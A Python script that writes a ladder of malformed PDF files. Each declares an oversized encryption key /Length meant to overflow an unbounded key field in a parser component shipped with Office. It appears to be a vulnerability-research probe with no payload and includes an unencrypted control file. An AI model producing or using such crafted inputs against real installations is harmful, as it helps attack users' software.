#!/usr/bin/env python3
"""Emit minimal PDFs whose /Encrypt dictionary declares a range of key lengths.

The point of the ladder is the relationship between the declared /Length and a fixed-size
key field in the consumer: the shipped copy of the parser in Office carries no upper bound on
this field, while the current public build of the same component rejects lengths above 32 bytes
with "key length is too long, key length is N, max length is 32". Records therefore vary
/Length from the ordinary values up through and past the 32-byte boundary, with /O and /U
sized to match so a length-vs-payload consistency check cannot reject the file first.
"""
import os
import sys

OUT = sys.argv[1] if len(sys.argv) > 1 else "pdfenc"
os.makedirs(OUT, exist_ok=True)

LENS = [40, 128, 160, 256, 264, 512, 1024, 4096, 0x7FFFFFFF]


def obj(n, body):
    return b"%d 0 obj\n%s\nendobj\n" % (n, body)


def build(length, name):
    nbytes = min(max(length // 8, 1), 4096)
    o = b"(" + bytes([(i * 7 + 3) & 0x7F if ((i * 7 + 3) & 0x7F) not in (0x28, 0x29, 0x5C) else 0x41
                      for i in range(nbytes)]) + b")"
    u = b"(" + bytes([(i * 11 + 5) & 0x7F if ((i * 11 + 5) & 0x7F) not in (0x28, 0x29, 0x5C) else 0x42
                      for i in range(nbytes)]) + b")"
    cf_len = min(max(length // 8, 1), 4096)
    parts = []
    parts.append(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
    off = [0] * 6
    off[1] = len(parts[0])
    parts.append(obj(1, b"<< /Type /Catalog /Pages 2 0 R >>"))
    off[2] = sum(len(x) for x in parts)
    parts.append(obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"))
    off[3] = sum(len(x) for x in parts)
    parts.append(obj(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>"))
    off[4] = sum(len(x) for x in parts)
    parts.append(obj(4, b"<< /Filter /Standard /V 4 /R 4 /Length " + str(length).encode() +
                     b" /O " + o + b" /U " + u + b" /P -3904"
                     b" /CF << /StdCF << /AuthEvent /DocOpen /CFM /AESV2 /Length " +
                     str(min(cf_len, 16)).encode() + b" >> >> /StmF /StdCF /StrF /StdCF >>"))
    hdr = sum(len(x) for x in parts)
    xref = b"xref\n0 5\n0000000000 65535 f \n"
    for i in (1, 2, 3, 4):
        xref += b"%010d 00000 n \n" % off[i]
    body = b"".join(parts) + xref
    body += (b"trailer\n<< /Size 5 /Root 1 0 R /Encrypt 4 0 R "
             b"/ID [<41414141414141414141414141414141> <41414141414141414141414141414141>] >>\n"
             b"startxref\n%d\n%%%%EOF\n" % hdr)
    p = os.path.join(OUT, name)
    with open(p, "wb") as fh:
        fh.write(body)
    return len(body)


n = 0
for L in LENS:
    sz = build(L, "enc_l%d.pdf" % L)
    print("wrote enc_l%d.pdf bytes=%d declared_Length=%d" % (L, sz, L))
    n += 1
# a plain unencrypted control, so "the app opened nothing" can be told from "opened, no fault"
build(128, "_tmp.pdf")
os.remove(os.path.join(OUT, "_tmp.pdf"))
with open(os.path.join(OUT, "plain.pdf"), "wb") as fh:
    fh.write(b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
             b"2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n"
             b"trailer\n<< /Size 3 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n")
print("files=%d + plain.pdf" % n)
